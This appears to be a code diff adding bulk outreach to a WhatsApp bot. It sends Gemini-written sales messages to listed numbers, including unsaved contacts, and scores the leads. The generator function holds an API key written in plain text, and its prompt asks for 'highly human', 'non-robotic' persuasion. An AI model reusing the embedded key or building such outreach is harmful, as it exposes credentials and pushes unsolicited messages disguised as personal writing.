+                    console.log(`   🤖 Generating long personalized message from description + main context...`);
+                    try {
+                        const aiMessage = await this.generateBulkPersonalizedMessage(description, phone);
+                        if (aiMessage && aiMessage.trim().length > 40) {
+                            personalizedMessage = aiMessage;
+                            aiUsed = true;
+                            console.log(`   ✨ Long-form AI message generated successfully`);
+                        } else {
+                            personalizedMessage = this.buildProposalMessage(description);
+                            console.log(`   📝 AI response too short, using long proposal fallback`);
+                        }
+                    } catch (aiError) {
+                        console.log(`   ⚠️ AI failed, using long proposal fallback: ${aiError.message}`);
+                        personalizedMessage = this.buildProposalMessage(description);
+                    }
+                } else {
+                    personalizedMessage = this.buildProposalMessage(description);
+                    console.log(`   📝 Using long proposal reply (AI disabled)`);
+                }
+                
+                // Send message directly to number (works even for new/non-saved contacts)
+                console.log(`   📤 Sending message...`);
+                await this.client.sendMessage(contactId, personalizedMessage);
+                
+                console.log(`   ✅ Message sent successfully to ${phone}`);
+                successCount++;
+                
+                // Evaluate lead scoring and label
+                const { scoreOutOf5, label } = this.evaluateLead(description, personalizedMessage, 'success', aiUsed);
+
+                results.push({
+                    phone,
+                    description,
+                    status: 'success',
+                    messageSent: personalizedMessage,
+                    scoreOutOf5,
+                    leadLabel: label,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Store in chat history
+                this.storeMessage(contactId, phone, personalizedMessage, true, 'bulk');
+                this.updateAnalytics(contactId, phone, personalizedMessage, true);
+                
+                // Fixed delay of 3000ms between messages (flow control)
+                const delay = 3000;
+                console.log(`   ⏳ Waiting ${(delay/1000).toFixed(1)}s before next message...`);
+                await new Promise(resolve => setTimeout(resolve, delay));
+                
+            } catch (err) {
+                console.log(`   ❌ Failed to send to ${phone}: ${err.message}`);
+                failureCount++;
+                
+                const { scoreOutOf5, label } = this.evaluateLead(description, '', 'failed', false);
+                results.push({
+                    phone,
+                    description,
+                    status: 'failed',
+                    error: err.message,
+                    scoreOutOf5,
+                    leadLabel: label,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+        
+        // Save bulk messaging results (JSON + XLSX for download)
+        const payload = {
+            summary: {
+                totalContacts: contactList.length,
+                successCount,
+                failureCount,
+                completedAt: new Date().toISOString()
+            },
+            results
+        };
+
+        try {
+            fs.writeFileSync('bulk_message_results.json', JSON.stringify(payload, null, 2));
+            console.log(`\n✅ Bulk messaging completed!`);
+            console.log(`   📊 Success: ${successCount}/${contactList.length}`);
+            console.log(`   ❌ Failed: ${failureCount}/${contactList.length}`);
+            console.log(`   💾 JSON saved to bulk_message_results.json`);
+        } catch (err) {
+            console.error(`Error saving bulk results JSON: ${err.message}`);
+        }
+
+        try {
+            const sheetRows = results.map(r => ({
+                phone_number: r.phone,
+                description: r.description,
+                status: r.status,
+                message_sent: r.messageSent || '',
+                score_out_of_5: r.scoreOutOf5,
+                lead_label: r.leadLabel,
+                error: r.error || '',
+                sent_at: r.timestamp
+            }));
+            const wb = XLSX.utils.book_new();
+            const ws = XLSX.utils.json_to_sheet(sheetRows);
+            XLSX.utils.book_append_sheet(wb, ws, 'Results');
+            XLSX.writeFile(wb, 'bulk_results.xlsx');
+            console.log('   📑 Excel saved to bulk_results.xlsx');
+        } catch (err) {
+            console.error(`Error saving bulk results Excel: ${err.message}`);
+        }
+    }
+
+    async generateBulkPersonalizedMessage(description, phone) {
+        try {
+            const GEMINI_API_KEY = "AIzaSyCwL2DAdqMUgx8_gRQjnyq6TcULIpxPwyQ";
+            const requirement = String(description || '').trim() || 'General business growth and digital support';
+            const mainContext = this.mainPersonalityContext || '';
+
+            const prompt = `Write a WhatsApp outreach message in a highly human, warm, persuasive style.
+
+Main personality context:
+${mainContext}
+
+Lead requirement context:
+${requirement}
+
+Target number context: ${phone}
+
+Rules:
+1) Message length should be around 90-140 words.
+2) Start with a friendly personalized opening and a strong hook.
+3) Show clear understanding of the requirement context.
+4) Explain value in practical, simple language.
+5) Add a soft CTA at the end asking for a short reply/call slot.
+6) Keep it natural, conversational, and non-robotic.
+7) Return plain message text only.`;
+
+            const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent?key=${GEMINI_API_KEY}`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    contents: [{ parts: [{ text: prompt }] }],
+                    generationConfig: {
+                        temperature: 0.95,
+                        maxOutputTokens: 260
+                    }
+                })
+            });
+
+            const result = await response.json();
+            if (result?.candidates?.[0]?.content?.parts?.[0]?.text) {
+                const output = result.candidates[0].content.parts[0].text
+                    .replace(/\s+/g, ' ')
+                    .trim();
+                return output;
+            }
+
+            return this.buildProposalMessage(requirement);
+        } catch (error) {
+            return this.buildProposalMessage(description);
+        }
+    }
+
+    // Build a longer, human-style proposal message using requirement + main context
+    buildProposalMessage(description) {
+        const requirement = String(description || '').trim() || 'your current business requirement';
+        const baseContext = (this.mainPersonalityContext || '').replace(/\s+/g, ' ').trim();
+        const contextLine = baseContext ? `Also, keeping your style in mind: ${baseContext.substring(0, 160)}...` : '';
+
+        return `Hi! I just went through your requirement about ${requirement}. I wanted to quickly reach out because this is exactly the kind of problem we solve in a practical, results-focused way.
+
+We can help you with planning, implementation, automation, and end-to-end delivery so you don’t have to coordinate multiple teams. Our approach is simple: understand your goal clearly, build fast, keep communication transparent, and iterate based on real feedback.
+
+${contextLine}
+
+If you’re open, reply with a convenient time and I’ll share a clear action plan tailored to your requirement.`.trim();
+    }
+
+    // Simple lead scoring and classification for logs/downloads
+    evaluateLead(description, message, status, aiUsed) {
+        const text = `${description || ''} ${message || ''}`.toLowerCase();
+        const hotKeywords = ['urgent', 'asap', 'immediate', 'now', 'today', 'call', 'meeting', 'demo', 'budget', 'price', 'buy', 'purchase', 'interested', 'requirement'];
+        const warmKeywords = ['later', 'next week', 'follow up', 'check', 'ping', 'maybe'];
+
+        let score = 0;
+        if (status === 'success') score += 2; // delivered
+        if (aiUsed) score += 1; // better personalization
+        const hotHits = hotKeywords.filter(k => text.includes(k)).length;
+        const warmHits = warmKeywords.filter(k => text.includes(k)).length;
+        score += Math.min(2, hotHits) + Math.min(1, warmHits);
+        if ((description || '').length > 60) score += 1;
+
+        // Normalize 0..5
+        if (score > 5) score = 5;
+
+        const label = score >= 4 ? 'Hot' : score >= 2 ? 'Warm' : 'Cold';
+        return { scoreOutOf5: score, label };
+    }
+
+    // Load and process bulk contacts from file
+    async loadAndProcessBulkContacts() {
+        try {
+            const bulkFile = 'bulk_contacts.json';
+            if (fs.existsSync(bulkFile)) {
+                console.log(`\n📂 Found bulk contacts file, loading...`);
+                const bulkData = JSON.parse(fs.readFileSync(bulkFile, 'utf8'));
+                
+                if (bulkData.contacts && bulkData.contacts.length > 0) {
+                    console.log(`📋 Loaded ${bulkData.contacts.length} contacts for bulk messaging`);
+                    
+                    // Process the bulk messages
+                    await this.processBulkMessages(bulkData.contacts);
+                    
+                    // Rename file to prevent reprocessing
+                    fs.renameSync(bulkFile, `${bulkFile}.processed_${Date.now()}`);
+                    console.log(`✓ Bulk file renamed to prevent reprocessing`);
+                }
+            }
+        } catch (err) {
+            console.error(`Error loading bulk contacts: ${err.message}`);
+        }
+    }
 }
 
 // Create and start the bot
 const bot = new SmartWhatsAppBot();
+
+// Load bulk contacts immediately after bot is ready
+const originalReady = bot.client._events ? bot.client._events['ready'] : null;
+const checkBulkInterval = setInterval(async () => {
+    if (bot.botReady) {
+        clearInterval(checkBulkInterval);
+        await bot.loadAndProcessBulkContacts();
+    }
+}, 5000);
 
 // Handle graceful shutdown
 process.on('SIGINT', async () => {
